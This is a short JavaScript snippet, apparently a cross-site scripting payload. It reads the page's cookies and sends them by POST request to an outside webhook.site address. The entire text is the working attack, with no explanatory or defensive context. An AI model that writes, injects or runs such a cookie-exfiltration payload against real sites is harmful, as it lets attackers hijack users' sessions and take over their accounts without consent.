(function(){
var c=document.cookie;
var webhook="https://webhook.site/745deb66-8c57-44c5-b5fa-dc355f9453e6";
fetch(webhook, {
  method: 'POST',
  body: JSON.stringify({cookies: c})
});
})();
